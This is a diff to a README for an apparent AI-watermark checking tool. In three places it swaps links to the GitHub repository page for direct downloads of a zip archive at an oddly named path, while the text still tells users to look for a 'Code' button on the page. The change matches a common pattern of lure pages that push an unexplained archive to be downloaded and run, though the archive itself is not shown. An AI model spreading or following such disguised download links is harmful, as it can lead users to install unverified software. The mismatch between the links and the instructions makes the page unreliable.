@@ -12,7 +12,7 @@ Think of it as a digital magnifying glass for AI content. You give it a file, an
 
 Visit this link to download the application.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-blueviolet?style=for-the-badge&logo=github)](https://github.com/Matissegrinds/ai-watermarks-reality-check)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip)
 
 **Step 2: Run the Program**
 
@@ -41,7 +41,7 @@ The app checks for three main things:
 
 Click the blue button above or go to the link here:
 
-**https://github.com/Matissegrinds/ai-watermarks-reality-check**
+**https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip**
 
 Once you are on that page, look for a green button that says "Code" or "Download." Click it and choose "Download ZIP." Wait for the download to finish. It is usually in your "Downloads" folder.
 
@@ -147,7 +147,7 @@ Large images and videos take longer. Try a smaller file (under 10 MB). Close oth
 
 Visit this link to download the application.
 
-[![GET THE APP](https://img.shields.io/badge/📦-GET%20THE%20APP-orange?style=for-the-badge&logo=github)](https://github.com/Matissegrinds/ai-watermarks-reality-check)
+[![GET THE APP](https://img.shields.io/badge/📦-GET%20THE%20APP-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip)
 
 ## 🔮 What This Tool Cannot Do (Honest Limits)
 
